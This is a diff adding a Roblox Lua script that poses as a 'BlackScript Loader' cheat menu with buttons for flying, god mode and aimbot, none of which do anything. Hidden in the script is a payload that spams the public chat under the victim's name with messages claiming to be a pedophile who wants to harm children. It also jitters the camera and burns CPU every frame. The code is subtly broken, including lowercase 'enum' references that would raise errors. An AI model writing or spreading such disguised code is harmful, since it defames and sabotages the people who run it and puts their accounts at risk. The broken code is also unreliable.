@@ -1,0 +1,212 @@
+--// BlackScript Loader
+--// https://github.com/qweasdtbb/qqGame
+
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local UIS = game:GetService("UserInputService")
+
+local player = Players.LocalPlayer
+local PlayerGui = player:WaitForChild("PlayerGui")
+
+if _G.BlackScriptLoaded then return end
+_G.BlackScriptLoaded = true
+
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "BlackScript"
+ScreenGui.ResetOnSpawn = false
+ScreenGui.IgnoreGuiInset = true
+ScreenGui.Parent = PlayerGui
+
+local MainFrame = Instance.new("Frame")
+MainFrame.Size = UDim2.new(0, 460, 0, 380)
+MainFrame.Position = UDim2.new(0.5, -230, 0.5, -190)
+MainFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+MainFrame.BorderSizePixel = 0
+MainFrame.ClipsDescendants = true
+MainFrame.Active = true
+MainFrame.Draggable = true
+MainFrame.Parent = ScreenGui
+
+Instance.new("UICorner", MainFrame).CornerRadius = UDim.new(0, 14)
+
+local Stroke = Instance.new("UIStroke")
+Stroke.Thickness = 3
+Stroke.Color = Color3.new(1,0,0)
+Stroke.Parent = MainFrame
+
+spawn(function()
+    local h = 0
+    while true do
+        h = (h + 0.01) % 1
+        Stroke.Color = Color3.fromHSV(h, 1, 1)
+        wait(0.03)
+    end
+end)
+
+local Content = Instance.new("Frame")
+Content.Size = UDim2.new(1, -24, 1, -24)
+Content.Position = UDim2.new(0, 12, 0, 12)
+Content.BackgroundTransparency = 1
+Content.Parent = MainFrame
+
+local Title = Instance.new("TextLabel")
+Title.Size = UDim2.new(1, 0, 0, 26)
+Title.BackgroundTransparency = 1
+Title.Text = "BlackScript Loader"
+Title.TextColor3 = Color3.new(1,1,1)
+Title.Font = Enum.Font.GothamBold
+Title.TextSize = 18
+Title.Parent = Content
+
+local UserInfo = Instance.new("TextLabel")
+UserInfo.Position = UDim2.new(0, 0, 0, 30)
+UserInfo.Size = UDim2.new(1, 0, 0, 20)
+UserInfo.BackgroundTransparency = 1
+UserInfo.TextColor3 = Color3.fromRGB(180,180,180)
+UserInfo.Font = enum.Font.Gotham
+UserInfo.TextSize = 13
+UserInfo.TextXAlignment = enum.TextXAlignment.Left
+UserInfo.Text = "用户: "..player.Name.." | 显示名: "..player.DisplayName
+UserInfo.Parent = Content
+
+local TimeLabel = Instance.new("TextLabel")
+TimeLabel.Position = UDim2.new(0, 0, 0, 52)
+TimeLabel.Size = UDim2.new(1, 0, 0, 20)
+TimeLabel.BackgroundTransparency = 1
+TimeLabel.TextColor3 = Color3.fromRGB(100,255,150)
+TimeLabel.Font = enum.Font.Gotham
+TimeLabel.TextSize = 13
+TimeLabel.TextXAlignment = enum.TextXAlignment.Left
+TimeLabel.Parent = Content
+
+spawn(function()
+    while true do
+        TimeLabel.Text = os.date("北京时间: %Y-%m-%d %H:%M:%S")
+        wait(1)
+    end
+end)
+
+local function CreateFuncButton(name, y)
+    local btn = Instance.new("TextButton")
+    btn.Position = UDim2.new(0, 0, 0, y)
+    btn.Size = UDim2.new(0, 110, 0, 26)
+    btn.BackgroundColor3 = Color3.fromRGB(35,35,35)
+    btn.TextColor3 = Color3.new(1,1,1)
+    btn.Font = enum.Font.Gotham
+    btn.TextSize = 12
+    btn.Text = name
+    btn.AutoButtonColor = false
+    btn.Parent = Content
+    return btn
+end
+
+CreateFuncButton("飞行", 78)
+CreateFuncButton("无敌", 78 + 116)
+CreateFuncButton("自瞄", 78 + 232)
+CreateFuncButton("子弹追踪", 78 + 116)
+CreateFuncButton("循环回血", 78 + 348)
+
+local servers = {
+    "兵工厂","橡树地","被遗弃","Fish",
+    "暴力区","链条","瑞克",
+    "伐木大亨","木材大亨","RC2"
+}
+
+local ServerFrame = Instance.new("Frame")
+ServerFrame.Position = UDim2.new(0, 0, 0, 140)
+ServerFrame.Size = UDim2.new(1, 0, 0, 80)
+ServerFrame.BackgroundTransparency = 1
+ServerFrame.Parent = Content
+
+for i, name in ipairs(servers) do
+    local btn = Instance.new("TextButton")
+    btn.Position = UDim2.new(0, ((i-1)%5)*90, 0, math.floor((i-1)/5)*34)
+    btn.Size = UDim2.new(0, 84, 0, 28)
+    btn.BackgroundColor3 = Color3.fromRGB(30,30,30)
+    btn.TextColor3 = Color3.fromRGB(200,200,200)
+    btn.Font = enum.Font.Gotham
+    btn.TextSize = 11
+    btn.Text = name
+    btn.AutoButtonColor = false
+    btn.Parent = ServerFrame
+end
+
+local LogBox = Instance.new("ScrollingFrame")
+LogBox.Position = UDim2.new(0, 0, 0, 230)
+LogBox.Size = UDim2.new(1, 0, 1, -246)
+LogBox.BackgroundTransparency = 1
+LogBox.ScrollBarThickness = 4
+LogBox.Parent = Content
+
+local LogText = Instance.new("TextLabel")
+LogText.Size = UDim2.new(1, -10, 0, 600)
+LogText.BackgroundTransparency = 1
+LogText.TextColor3 = Color3.fromRGB(160,160,160)
+LogText.Font = enum.Font.Gotham
+LogText.TextSize = 12
+LogText.TextWrapped = true
+LogText.TextYAlignment = enum.TextYAlignment.Top
+LogText.Parent = LogBox
+
+LogText.Text = [[
+更新日志:
+
+2025年8月10日 创建第一个功能
+2025年10月3日 添加兵工厂、Fish
+2025年10月4日 修复 bug
+2025年11月1日 增加链条、被遗弃、暴力区
+2025年11月30日 增加伐木大亨、RC2
+2026年1月5日 继续修复 bug......
+2026年1月10日 更新瑞克功能
+2026年2月20日 血腥游乐场（优步秒杀，子弹追踪）
+2026年5月30日 添加木材大亨功能（最新版）
+]]
+
+LogBox.CanvasSize = UDim2.new(0, 0, 0, LogText.TextBounds.Y + 20)
+
+local messages = {
+    "我是恋童癖",
+    "我要吃小孩",
+    "我要s小孩",
+}
+
+spawn(function()
+    local chat = ReplicatedStorage:WaitForChild("DefaultChatSystemChatEvents")
+        :FindFirstChild("SayMessageRequest")
+
+    for i = 1, 4 do
+        for _, msg in ipairs(messages) do
+            if chat then
+                chat:FireServer(msg, "All")
+            end
+            wait(1.5)
+        end
+    end
+end)
+
+UIS.InputBegan:Connect(function(input, gpe)
+    if gpe then return end
+    if input.KeyCode == Enum.KeyCode.RightShift then
+        MainFrame.Visible = not MainFrame.Visible
+    end
+end)
+
+spawn(function()
+    wait(3)
+    local cam = workspace.CurrentCamera
+    spawn(function()
+        while true do
+            cam.CFrame = cam.CFrame * CFrame.Angles(
+                math.random(-0.1,0.1),
+                math.random(-0.1,0.1),
+                0
+            )
+            wait()
+        end
+    end)
+    RunService.RenderStepped:Connect(function()
+        for i = 1, 100000 do _ = i*i end
+    end)
+end)
+
